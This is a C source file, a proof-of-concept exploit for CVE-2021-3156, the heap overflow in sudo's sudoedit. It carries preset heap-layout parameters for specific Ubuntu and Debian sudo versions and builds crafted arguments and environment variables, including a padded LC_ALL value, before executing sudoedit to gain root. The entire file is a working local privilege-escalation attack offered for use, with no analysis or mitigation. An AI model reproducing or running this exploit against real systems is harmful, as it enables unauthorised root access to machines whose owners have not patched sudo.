/*
  CVE-2021-3156 PoC by Zach

  I make no guarentees or promises or warranties
  
  Exploit for the sudo heap overflow
  this is very old
  I thought i'd tinker with something easy to ease into it
 
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#define MAX_ENV 512
#define SUDOEDIT "/usr/bin/sudoedit"

typedef struct {
    char *name;
    char *bin;
    int len_a;
    int len_b;
    int nulls;
    int lcall;
} target_t;

target_t presets[] = {
    { "Ubuntu 18.04.5 - sudo 1.8.21", SUDOEDIT, 56, 54, 63, 212 },
    { "Ubuntu 20.04.1 - sudo 1.8.31", SUDOEDIT, 56, 54, 63, 212 },
    { "Debian 10.0 - sudo 1.8.27",    SUDOEDIT, 64, 49, 60, 214 }
};

void show_usage(const char *bin) {
    puts("Usage:");
    printf("  %s <target_index>\n", bin);
    puts("  or:");
    printf("  %s <len_a> <len_b> <nulls> <lcall>\n", bin);
    puts("\nTargets:");
    for (int i = 0; i < sizeof(presets)/sizeof(target_t); i++)
        printf("  %d) %s\n", i, presets[i].name);
}

int parse_int(const char *s) {
    char *end;
    int val = strtol(s, &end, 10);
    if (*end != '\0') {
        fprintf(stderr, "invalid integer: %s\n", s);
        exit(1);
    }
    return val;
}

int main(int argc, char *argv[]) {
    if (argc == 2 && strcmp(argv[1], "--help") == 0) {
        show_usage(argv[0]);
        return 0;
    }

    target_t *t = NULL;
    target_t manual = { .name = "manual", .bin = SUDOEDIT };

    if (argc == 2) {
        int idx = parse_int(argv[1]);
        int count = sizeof(presets) / sizeof(target_t);
        if (idx < 0 || idx >= count) {
            fprintf(stderr, "invalid target index\n");
            return 1;
        }
        t = &presets[idx];
    } else if (argc == 5) {
        manual.len_a = parse_int(argv[1]);
        manual.len_b = parse_int(argv[2]);
        manual.nulls = parse_int(argv[3]);
        manual.lcall = parse_int(argv[4]);
        t = &manual;
    } else {
        show_usage(argv[0]);
        return 1;
    }

    printf("target: %s [%s] (%d, %d, %d, %d)\n",
        t->name, t->bin, t->len_a, t->len_b, t->nulls, t->lcall);

    char *buf_a = calloc(t->len_a + 2, 1);
    char *buf_b = calloc(t->len_b + 2, 1);
    if (!buf_a || !buf_b) {
        perror("calloc");
        return 1;
    }

    memset(buf_a, 'A', t->len_a);
    buf_a[t->len_a] = '\\';

    memset(buf_b, 'B', t->len_b);
    buf_b[t->len_b] = '\\';

    char *args[] = { "sudoedit", "-s", buf_a, "\\", buf_b, NULL };
    char *envs[MAX_ENV];
    int pos = 0;

    for (int i = 0; i < t->nulls && pos < MAX_ENV - 1; i++)
        envs[pos++] = "\\";

    envs[pos++] = "X/P0P_SH3LLZ_";

    char *lc = calloc(t->lcall + 16, 1);
    if (!lc) {
        perror("calloc");
        return 1;
    }

    strcpy(lc, "LC_ALL=C.UTF-8@");
    memset(lc + 15, 'C', t->lcall);
    envs[pos++] = lc;
    envs[pos] = NULL;

    puts("running exploit...");
    execve(t->bin, args, envs);
    perror("execve");
    return 1;
}
